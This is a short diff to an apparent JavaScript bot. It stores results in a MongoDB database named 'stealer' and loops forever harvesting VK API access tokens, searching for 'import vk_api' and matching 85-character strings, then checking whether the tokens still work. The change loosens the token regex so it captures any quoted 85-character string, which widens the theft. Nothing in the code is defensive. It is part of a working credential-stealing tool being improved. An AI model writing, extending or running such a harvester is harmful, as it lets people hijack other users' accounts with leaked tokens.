@@ -50,10 +50,6 @@ const hearCommand = (name, handle) => {
 	);
 };
 
-function unique(arr) {
-    return Array.from(new Set(arr));
-}
-
 client.connect(async function(err, client) {
     const db = client.db("stealer")
     const users = db.collection("users");
@@ -129,7 +125,7 @@ client.connect(async function(err, client) {
 
     async function dbupdate() {
         while (true) {
-            let new_tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
+            let new_tokens = await get_tokens('import vk_api', /['"]([a-zA-Z0-9]{85})['"]/);
             let new_checks = await vk_checker(new_tokens);
 
             await Promise.all(new_checks.map(async (check) => {
